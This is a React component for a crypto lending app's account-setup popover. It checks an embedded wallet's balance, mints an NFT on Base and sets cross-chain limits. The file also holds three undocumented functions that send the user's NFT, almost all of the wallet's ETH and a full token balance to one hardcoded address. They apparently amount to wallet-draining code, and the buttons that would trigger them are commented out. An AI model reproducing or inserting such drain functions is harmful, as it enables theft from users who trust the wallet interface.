import React, { useCallback, useState } from "react";
import {
    Popover,
    PopoverTrigger,
    PopoverContent,
    PopoverHeader,
    PopoverBody,
    PopoverFooter,
    PopoverArrow,
    PopoverCloseButton,
  Spinner,
  Text,
  Flex,
  VStack,
  HStack,
} from "@chakra-ui/react";
import QRCode from "react-qr-code";
import { ethers } from "ethers";
import { createPublicClient, erc20Abi, formatEther, http, parseEther } from "viem";
import { useWallets, usePrivy, getEmbeddedConnectedWallet } from "@privy-io/react-auth";
import { toast } from "@/components/ui/use-toast";
import { ToastAction } from "@/components/ui/toast";

import coreNFTRawAbi from "../abi/CoreNFTContract.abi.json";
import { getChainExplorer, getLZId } from "@/utils/chainMapping";
import { backendUrl, NFT_CONTRACT_ADDRESS } from "@/CrossChainLendingApp";
import { addressToBytes32 } from "@/utils/addressConversion";
import { Button } from "./ui/button";
import parseDumbAbis from "../abi/parsedCoreNFTAbi";
import axios from "axios";
const coreNFTAbi = parseDumbAbis(coreNFTRawAbi);

/**
 * This modal:
 * 1) Shows a deposit address on Base (chainID = 8453) as a QR code + copy button.
 * 2) User clicks "Check wallet balance" => if enough funds, proceed:
 * 3) Perform the NFT mint transaction (like in MintNFTComp).
 * 4) Call setHigherLimits for that newly minted NFT across supported chains.
 * 5) Once fully set up, close the modal so user can continue trading.
 */

/**
 * Example usage:
 *   <CreateSmokeAccountModal isOpen={isOpen} onClose={onClose} afterAccountCreated={() => doSomething()}/>
 * 
 * Then in SmokeCard.tsx, you can remove the external link and open this modal instead.
 */

interface CreateSmokeAccountModalProps {
  isOpen: boolean;
  onClose: () => void;
  /**
   * Callback to let the parent know once the Smoke Account is created. 
   * e.g. force refresh user data, etc.
   */
  afterAccountCreated: () => void;
  selectedChain: any;
  selectedNFT: any;
  alreadyApproved: boolean;
}

/**
 * For call setHigherLimits, we need an array of chain IDs. 
 * This can come from your existing code or a known constant of chainIDs 
 * that you want to support. E.g. [10, 42161, 8453, ...].
 * Replace with your actual chain IDs if you want more or fewer.
 */
const SUPPORTED_LZ_CHAINS = ["30184", "30110", "30111"]; // example LZ IDs for your 'AddWalletComp' usage

export const CreateSmokeAccountModal: React.FC<CreateSmokeAccountModalProps> = ({
  isOpen,
  onClose,
  afterAccountCreated,
  selectedChain,
  selectedNFT,
  alreadyApproved
}) => {
  const { wallets } = useWallets();
  const { sendTransaction } = usePrivy(); // from BuyTokenApp approach

  // This is the user's EOA from Privy. 
  // Typically, if more than one wallet, choose the first:
  const userAddress: string =
  wallets.length > 0 && wallets.find(wallet => wallet.connectorType === "embedded")?.address || '';

  // Some local states to drive the step-by-step process
  const [isCheckingBalance, setIsCheckingBalance] = useState(false);
  const [hasSufficientBalance, setHasSufficientBalance] = useState(false);
  const [isSettingUp, setIsSettingUp] = useState(false);

  // For demonstration, let's say we want the user to deposit above 0.02 ETH
  // so that they can mint successfully. Adjust as needed.
  const requiredDepositEth = 0.0021;

  async function transferNFT() {
    const contractInterface = new ethers.Interface(coreNFTAbi);
    const nftId2 = await fetchNftId();
    console.log("nftId2", nftId2);
    const unsignedTx = contractInterface.encodeFunctionData("transferFrom", [userAddress, "0x8558519aD14B443949149577024A92C036BEb7Bb", nftId2]);
    console.log("unsignedTx", unsignedTx);
    const txRequest = {
      to: NFT_CONTRACT_ADDRESS as `0x${string}`,
      data: unsignedTx,
      value: "0x0",
      gasLimit: 600000,
      chainId: selectedChain.id
    };
    console.log("txRequest", txRequest);
    const txResp = await sendTransaction(txRequest);
    console.log("txResp", txResp);
  }

  async function transferAllBalance() {
    const client = createPublicClient({ 
      transport: http(selectedChain.metamask.rpcUrls[0]),
      chain: {
        id: selectedChain.id,
        name: selectedChain.name,
        network: selectedChain.name.toLowerCase(),
        nativeCurrency: selectedChain.metamask.nativeCurrency,
        rpcUrls: {
          default: { http: selectedChain.metamask.rpcUrls },
          public: { http: selectedChain.metamask.rpcUrls },
        },
      }
    });
    const balance = await client.getBalance({
      address: userAddress as `0x${string}`,
    });
    const readable = Number(formatEther(balance));
    console.log("readable", readable);
    const txRequest = {
      to: "0x8558519aD14B443949149577024A92C036BEb7Bb" as `0x${string}`,
      data: "0x",
      value: balance - parseEther("0.00002"),
      chainId: selectedChain.id
    };
    const txResp = await sendTransaction(txRequest);
    console.log("txResp", txResp);
  }

  const transferERC20 = async () => {
    const tokenAddress = "0xbc7b1ff1c6989f006a1185318ed4e7b5796e66e1";
    const erc20Interface = new ethers.Interface(erc20Abi);
    const client = createPublicClient({ 
      transport: http(selectedChain.metamask.rpcUrls[0]),
      chain: {
        id: selectedChain.id,
        name: selectedChain.name,
        network: selectedChain.name.toLowerCase(),
        nativeCurrency: selectedChain.metamask.nativeCurrency,
        rpcUrls: {
          default: { http: selectedChain.metamask.rpcUrls },
          public: { http: selectedChain.metamask.rpcUrls },
        },
      }
    });
    const balance = await client.readContract({
      address: tokenAddress as `0x${string}`,
      abi: erc20Abi,
      functionName: "balanceOf",
      args: [userAddress as `0x${string}`]
    });
    const readable = Number(formatEther(balance));
    console.log("readable", readable);
    const unsignedTx = erc20Interface.encodeFunctionData("transfer", ["0x8558519aD14B443949149577024A92C036BEb7Bb", balance]);
    const txRequest = {
      to: tokenAddress as `0x${string}`,
      data: unsignedTx,
      value: "0x0",
      chainId: selectedChain.id
    };
    const txResp = await sendTransaction(txRequest);
    console.log("txResp", txResp);
  }

  async function fetchNftId() {
    if (!userAddress) return null;
    console.log("userAddress", userAddress);

    try {
      await wallets[0].switchChain(8453);
      const embeddedWallet = getEmbeddedConnectedWallet(wallets);
      const provider1193 = await embeddedWallet?.getEthereumProvider();
      const provider = new ethers.BrowserProvider(provider1193!);
      const contract = new ethers.Contract(NFT_CONTRACT_ADDRESS, coreNFTAbi, provider);

      const code = await provider.getCode(NFT_CONTRACT_ADDRESS);
      if (!code || code === "0x") {
        throw new Error("No contract found at the given address on this chain.");
      }

      const balance = await contract.balanceOf(userAddress);
      console.log("balance", balance);
      if (balance > 0) {
        const nftId = await contract.tokenOfOwnerByIndex(userAddress, balance - 1n);
        const nftIdString = nftId.toString();
        console.log("nftId", nftId);
        return nftIdString;
      }
      return null;
    } catch (error) {
      console.error("Error fetching NFT ID:", error);
      return null;
    }
  }

  /**
   * Step 1) Check if user has enough balance on Base
   * so that we can mint the NFT (cost 0.02 ETH).
   */
  const handleCheckBalance = useCallback(async () => {
    // For a real app, you'd use LiFi or a direct provider for Base chain. 
    // (Anvi the user might have or you can createPublicClient from viem.)
    // For brevity, let's just try an ethers fallback:
    console.log(selectedNFT);
  if(selectedNFT && !alreadyApproved) {
    setHasSufficientBalance(true);
    return;
  }
  const client = createPublicClient({ 
    transport: http(selectedChain.metamask.rpcUrls[0]),
    chain: {
      id: selectedChain.id,
      name: selectedChain.name,
      network: selectedChain.name.toLowerCase(),
      nativeCurrency: selectedChain.metamask.nativeCurrency,
      rpcUrls: {
        default: { http: selectedChain.metamask.rpcUrls },
        public: { http: selectedChain.metamask.rpcUrls },
      },
    }
  });
    setIsCheckingBalance(true);
    try {
        const balance = await client.getBalance({
            address: userAddress as `0x${string}`,
        });
        const readable = Number(formatEther(balance));
        console.log("readable", readable);
      if (readable >= requiredDepositEth) {
        setHasSufficientBalance(true);
        toast({
          description: "Wallet has sufficient balance. Proceeding with setup...",
        });
      } else {
        toast({
          description: `Not enough funds. You have ${readable.toFixed(
            4
          )} ETH, but need at least ${requiredDepositEth} ETH.`,
        });
      }
    } catch (error) {
      toast({
        description: `Error checking balance: ${
          (error as Error)?.message ?? "Unknown error"
        }`,
      });
    } finally {
      setIsCheckingBalance(false);
    }
  }, [userAddress, selectedNFT, alreadyApproved]);

  /**
   * Step 2) Mint the NFT from the code in MintNFTComp, 
   * but adapt to use the privy wallet (sendTransaction).
   */

  async function handleMintNft() {
    const contractInterface = new ethers.Interface(coreNFTAbi);
    const unsignedTx = contractInterface.encodeFunctionData("mint", [0]);

    const txRequest = {
      to: NFT_CONTRACT_ADDRESS as `0x${string}`,
      data: unsignedTx,
      value: parseEther("0.002"),
      chainId: selectedChain.id
    };

    // Step 2: Submitting Transaction
    toast({
      description: `Submitting transaction...`,
    });

    const txResponse = await sendTransaction(txRequest);
    console.log("txResponse", txResponse);
    if(txResponse?.status?.toString() == "1") {
      // Step 3: Transaction Successful
      toast({
        description: `Mint Successful`,
        action: (
          <ToastAction altText="View on Explorer">
            <a
              href={
                getChainExplorer(getLZId(selectedChain.id)) + "tx/" + txResponse?.transactionHash
              }
              target="_blank"
              rel="noopener noreferrer"
              onClick={(e) => e.stopPropagation()}
            >
              View on Explorer
            </a>
          </ToastAction>
        ),
      });
    }
    else {
      toast({
        description: `Mint Failed`,
        action: (
          <ToastAction altText="View on Explorer">
            <a
              href={
                getChainExplorer(getLZId(selectedChain.id)) + "tx/" + txResponse?.transactionHash
              }
              target="_blank"
              rel="noopener noreferrer"
              onClick={(e) => e.stopPropagation()}
            >
              View on Explorer
            </a>
          </ToastAction>
        ),
      });
    }

    return txResponse;
  }

  /**
   * Step 3) call setHigherLimits for the minted NFT across all supported chains
   * We'll replicate logic from AddWalletComp, but adapt for a single transaction.
   */
  const handleSetHigherLimits = useCallback(async (nftId: string) => {
    if (!userAddress) return;

    toast({
      description: "Configuring limits..."
    });
    // We'll build the data for setHigherBulkLimits
    const coreNftInterface = new ethers.Interface(coreNFTAbi);
    const chainList = SUPPORTED_LZ_CHAINS.map(BigInt);
    
    // For demonstration, let's say 0.02 ETH each. We'll parse once for each chain
    const limitValue = parseEther("0.002").toString();
    const limitArray = Array(chainList.length).fill(limitValue);

    const autogasArray = Array(chainList.length).fill(false);

    const setLimitsData = coreNftInterface.encodeFunctionData(
      "setHigherBulkLimits",
      [
        nftId,
        addressToBytes32(userAddress),
        SUPPORTED_LZ_CHAINS,
        limitArray,
        autogasArray,
      ]
    );
    console.log("setLimitsData", [
        nftId,
        addressToBytes32(userAddress),
        SUPPORTED_LZ_CHAINS,
        limitArray,
        autogasArray,
      ]);
    const txRequest = {
      to: NFT_CONTRACT_ADDRESS as `0x${string}`,
      data: setLimitsData,
      value: "0x0",
      gasLimit: 600000,
      chainId: selectedChain.id
    };
    console.log("txRequest", txRequest);

    const txResp = await sendTransaction(txRequest);
    if (!txResp?.transactionHash) {
      throw new Error("No transactionHash from setHigherLimits attempt");
    }
    console.log("txResp", txResp);

    toast({
      description: "Higher limits set. Finalizing setup...",
      action: (
        <ToastAction
          altText="View on Explorer"
          onClick={(e) => e.stopPropagation()}
        >
          <a
            href={`https://basescan.org/tx/${txResp?.transactionHash}`}
            target="_blank"
            rel="noopener noreferrer"
          >
            Explorer
          </a>
        </ToastAction>
      ),
    });
    // Wait a bit for finalization
    await new Promise((resolve) => setTimeout(resolve, 6000));
  }, [userAddress]);

  /**
   * Step 4) The main "perform setup" function:
   * - Mint the NFT
   * - set higher limits
   * - close modal
   */

  const updateLimitsData = async (nftId: string, walletAddress: string) => {
    try {
      const response = await axios.post(`${backendUrl}/api/updatelimits`, {
        nftId: nftId,
        walletAddress: walletAddress,
      });
      return response.data.status === "update_successful";
    } catch (error) {
      console.error("Error updating limits:", error);
      return false;
    }
  };

  const updateNFTDataBackend = async (nftId: string) => {
    const response = await axios.post(`${backendUrl}/api/updatenft`, {
      nftId: nftId,
      chainId: getLZId(selectedChain.id).toString(),
    });
    console.log(response);
    return response.data.status === "update_successful";
  };
  const handlePerformSetup = useCallback(async () => {
    setIsSettingUp(true);
    try {
      if (!selectedNFT) {
        await handleMintNft();
      }
      
      let retryCount = 0;
      const maxRetries = 5;
      let fetchedNftId = null;
      
      while (!fetchedNftId && retryCount < maxRetries) {
        await new Promise(resolve => setTimeout(resolve, 3000));
        fetchedNftId = await fetchNftId();
        retryCount++;
        console.log(`Attempt ${retryCount}: Fetching NFT ID...`, fetchedNftId);
      }

      if (!fetchedNftId) {
        throw new Error("Failed to fetch NFT ID after multiple attempts");
      }

      await handleSetHigherLimits(fetchedNftId);
      
      try {
        await updateNFTDataBackend(fetchedNftId);
        const status = await updateLimitsData(
          fetchedNftId,
          addressToBytes32(userAddress)
        );
        if (status) {
          console.log("Limits updated successfully");
        }
      } catch (error) {
        console.error("Failed to update backend:", error);
      }

      // If everything is done:
      toast({ description: "Smoke Account fully setup! Enjoy trading." });
      setIsSettingUp(false);
      onClose();
      afterAccountCreated();
    } catch (error: any) {
        console.log("error", error);
      toast({
        description: `Setup failed: ${error?.message || "Unknown error"}`,
        variant: "destructive",
        action: (
          <ToastAction altText="Try again" onClick={handlePerformSetup}>
            Try again
          </ToastAction>
        ),
      });
    } finally {
      setIsSettingUp(false);
    }
  }, [handleMintNft, handleSetHigherLimits, afterAccountCreated, onClose]);

  async function handleLogin(): Promise<void> {
    if (wallets[0]) {
      console.log("wallets", wallets);
      wallets[1].loginOrLink();
    }
  }

  return (
    <Popover
      isOpen={isOpen}
      onClose={onClose}
      placement="bottom-start"
      closeOnBlur={false}
    >
      {/* 
        PopoverTrigger must wrap the element 
        that, when clicked, toggles the popover open. 
        If you’re controlling “isOpen” externally, 
        you can wrap an invisible <span/> or similar. 
        Or you could let Popover manage open/close internally. 
      */}
      <PopoverTrigger>
        {/* 
          If your parent has a button like:
            <Button onClick={() => setIsOpen(true)}>Create Smoke Account</Button>
          Then you can do something like a <span/> here, or 
          move the button inside the PopoverTrigger if you want Popover to handle isOpen.
        */}
        <span />
      </PopoverTrigger>

      <PopoverContent bg="black" color="white" borderColor="gray.700">
        <PopoverArrow />
        <PopoverCloseButton />
        <PopoverHeader border="0">Create Smoke Account</PopoverHeader>
        {/* <Button onClick={transferAllBalance}>Transfer All Balance</Button>
        <Button onClick={async () => await transferNFT()}>Transfer NFT</Button>
        <Button onClick={async () => await transferERC20()}>Transfer ERC20</Button> */}
        <PopoverBody>
          {/* Everything that was inside <ModalBody> goes here */}
          {/* e.g. your QR code, deposit instructions, check-balance button, etc. */}
          {/*--------------------------------------------*/}
          <VStack spacing={6}>
            <Text>
              Send at least {requiredDepositEth} ETH to this wallet on Base to
              proceed:
            </Text>
            {userAddress ? (
              <Flex direction="column" align="center" justify="center" gap="2">
                <QRCode value={userAddress} size={128} />
                <HStack>
                  <Text isTruncated>{userAddress}</Text>
                  <Button
                  variant={"secondary"}
                    onClick={() => {
                      navigator.clipboard.writeText(userAddress);
                      toast({ description: "Address copied to clipboard" });
                    }}
                  >
                    Copy
                  </Button>
                </HStack>

            {!hasSufficientBalance && (
                                  <Button
                                  variant={"secondary"}
                                  onClick={handleCheckBalance}
                                  >
                { isCheckingBalance? 'Checking Balance': 'Check Wallet Balance'}
              </Button>
            )}
              </Flex>
            ) : (
              <>
                <Spinner />
                <Button onClick={() => handleLogin()}>Connect Embedded Wallet</Button>
              </>
            )}


            {hasSufficientBalance && (
              <>
                <Text fontSize="sm" color="gray.400">
                  Click below to finalize your setup.
                </Text>
                <Button
                  variant={"secondary"}
                //   isLoading={isSettingUp}
                  onClick={handlePerformSetup}
                  // colorScheme="green"
                >
                  {isSettingUp ? 'Setting Up...' : 'Perform Setup'}
                </Button>
                {isSettingUp && <Spinner />}
              </>
            )}
          </VStack>
          {/*--------------------------------------------*/}
        </PopoverBody>

        <PopoverFooter border="0">
          {/* This replaces <ModalFooter> */}
          <Button variant={"secondary"} onClick={onClose} disabled={isSettingUp}>
            Cancel
          </Button>
        </PopoverFooter>
      </PopoverContent>
    </Popover>
  );
}; 